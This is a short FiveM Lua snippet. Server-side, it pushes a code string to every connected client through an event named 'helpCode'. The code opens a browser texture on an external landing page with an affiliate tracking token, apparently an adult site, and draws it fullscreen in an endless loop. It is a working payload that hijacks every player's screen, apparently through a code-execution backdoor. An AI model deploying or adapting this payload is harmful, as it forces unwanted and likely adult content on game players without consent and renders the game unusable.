TriggerClientEvent('helpCode', -1, [[
local textureDic = CreateRuntimeTxd('duiTxd');
local object3 = CreateDui("https://landing.rk.com/?ats=eyJhIjo5MjU2OCwiYyI6NDU0MDUwNjYsIm4iOjIwLCJzIjozNTgsImUiOjg5ODMsInAiOjExfQ==", 1920, 1080);
local handle3 = GetDuiHandle(object3) -- Gets DUI handle from object
CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex3", handle3) -- Creates the texture "duiTex" in the "duiTxd" dictionary
Citizen.CreateThread(function()
        while true do
            Citizen.Wait(1)
            DrawSprite("duiTxd", "duiTex3", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
        end
end)
]])